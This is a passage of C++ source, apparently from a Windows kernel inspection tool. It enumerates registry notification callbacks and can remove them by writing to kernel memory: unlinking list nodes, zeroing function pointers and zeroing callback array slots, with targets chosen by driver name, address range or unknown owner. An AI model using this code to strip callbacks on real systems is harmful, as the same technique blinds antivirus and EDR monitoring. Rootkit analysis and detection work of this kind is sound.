                        if (existing.function == fn) { dup = true; break; }
                    }
                    if (dup) { cur = g_drv->Rd64(cur); idx++; continue; }

                    NotifyEntry e{};
                    e.index        = idx;
                    e.slotAddr     = cur;       // node address (for --kill: LIST_ENTRY unlink)
                    e.routineBlock = cur;
                    e.function     = fn;
                    e.context      = ctx;
                    e.ctxOwner     = nullptr;
                    e.ctxOwnerOff  = 0;
                    e.isLinkedList = true;
                    KUtil::FindDriverByAddr(fn, &e.owner, &e.ownerOff);
                    if (e.ownerOff > 0x4000000) { e.owner = L"<unknown>"; e.ownerOff = 0; }
                    if (ctx && g_drv->IsKernelVA(ctx)) {
                        KUtil::FindDriverByAddr(ctx, &e.ctxOwner, &e.ctxOwnerOff);
                        if (e.ctxOwnerOff > 0x4000000) { e.ctxOwner = nullptr; e.ctxOwnerOff = 0; }
                    }
                    v.push_back(e);
                }

                cur = g_drv->Rd64(cur);  // next Flink
                idx++;
            }
        }
    }

    if (v.empty() && !arrayVA && !killDriver) {
        printf("[!] Failed to locate CmpCallBackVector or CallbackListHead\n");
        return;
    }

    if (g_jsonMode) {
        printf("{\"command\":\"notify_registry\",\"array\":\"%p\",\"callbacks\":[\n",
               (void*)arrayVA);
        bool first = true;
        for (auto& e : v) {
            if (!first) printf(",\n");
            first = false;
            printf(" {\"slot\":%d,\"block\":%s,\"fn\":%s,"
                   "\"owner\":%s,\"offset\":\"0x%llx\"}",
                e.index,
                JAddr(e.routineBlock).c_str(),
                JAddr(e.function).c_str(),
                JEscape(e.owner).c_str(),
                (unsigned long long)e.ownerOff);
        }
        printf("\n]}\n");
        return;
    }

    printf("\n=== CmRegisterCallback Routines ===\n");
    if (v.empty()) {
        printf("  (none)\n\n");
        return;
    }

    // If --kill-kva given, read DriverStart/DriverSize from DriverObject for range matching.
    // DRIVER_OBJECT layout (x64): +0x18 DriverStart (PVOID), +0x20 DriverSize (ULONG)
    DWORD64 killRangeBase = 0, killRangeEnd = 0;
    if (killKva) {
        // Dump first 8 qwords of DriverObject for layout verification
        printf("DriverObject dump @ %p:\n", (void*)killKva);
        for (int q = 0; q < 8; q++) {
            DWORD64 val = g_drv->Rd64(killKva + (DWORD64)q * 8);
            printf("  +0x%02x: %016llX\n", q * 8, (unsigned long long)val);
        }
        killRangeBase = g_drv->Rd64(killKva + 0x18);
        DWORD64 sz    = g_drv->Rd64(killKva + 0x20) & 0xFFFFFFFF; // ULONG
        killRangeEnd  = killRangeBase + sz;
        printf("Kill range: %p -- %p (DriverStart+DriverSize)\n",
               (void*)killRangeBase, (void*)killRangeEnd);
    }

    int killed = 0;
    for (int idx = 0; idx < (int)v.size(); idx++) {
        auto& e = v[idx];
        PrintEntry(idx, e, "Registry");

        bool shouldKill = false;

        // Path 1: name match (when driver is visible in module list)
        if (killDriver && e.owner) {
            char narrow[256]{};
            WideCharToMultiByte(CP_ACP, 0, e.owner, -1, narrow, 255, nullptr, nullptr);
            const char* base = strrchr(narrow, '\\');
            base = base ? base + 1 : narrow;
            shouldKill = (_stricmp(base, killDriver) == 0);
            if (!shouldKill) {
                char killBase[256]; strncpy(killBase, killDriver, 255); killBase[255] = '\0';
                char* dot = strrchr(killBase, '.');
                char narrowBase[256]; strncpy(narrowBase, base, 255); narrowBase[255] = '\0';
                char* dot2 = strrchr(narrowBase, '.');
                if (dot)  *dot  = '\0';
                if (dot2) *dot2 = '\0';
                shouldKill = (_stricmp(narrowBase, killBase) == 0);
            }
        }

        // Path 2: range match via DriverObject KVA (handles DKOM-hidden drivers)
        if (!shouldKill && killRangeBase && killRangeEnd > killRangeBase) {
            shouldKill = (e.function >= killRangeBase && e.function < killRangeEnd);
        }

        // Path 3: kill all entries whose fn doesn't resolve to any known driver
        if (!shouldKill && killUnknown) {
            shouldKill = (!e.owner || wcscmp(e.owner, L"<unknown>") == 0);
        }

        if (shouldKill) {
            if (e.isLinkedList) {
                // Linked list node: unlink from doubly-linked list
                // Node layout: +0x00 Flink, +0x08 Blink
                DWORD64 node  = e.slotAddr;
                DWORD64 flink = g_drv->Rd64(node + 0x00);
                DWORD64 blink = g_drv->Rd64(node + 0x08);

                if (!g_drv->IsKernelVA(flink) || !g_drv->IsKernelVA(blink)) {
                    printf("  %s[!] SKIP -- bad Flink/Blink (Flink=%p Blink=%p)%s\n",
                           A_RED, (void*)flink, (void*)blink, A_RESET);
                } else {
                    // prev->Flink = next;  next->Blink = prev
                    g_drv->Wr64(blink + 0x00, flink);
                    g_drv->Wr64(flink + 0x08, blink);
                    // Zero the function pointer to prevent concurrent invocation
                    g_drv->Wr64(node + 0x28, 0);
                    printf("  %s[+] KILLED -- unlinked from list (Flink=%p Blink=%p)%s\n",
                           A_GREEN, (void*)flink, (void*)blink, A_RESET);
                    killed++;
                }
            } else {
                // Array slot: zero the EX_CALLBACK entry — kernel skips NULL
                g_drv->Wr64(e.slotAddr, 0);
                printf("  %s[+] KILLED -- slot zeroed%s\n", A_GREEN, A_RESET);
                killed++;
            }
        }
    }

    printf("\n  Total: %zu registry callbacks", v.size());
    if (killDriver || killKva || killUnknown) printf("  Killed: %d", killed);
    printf("\n\n");
}
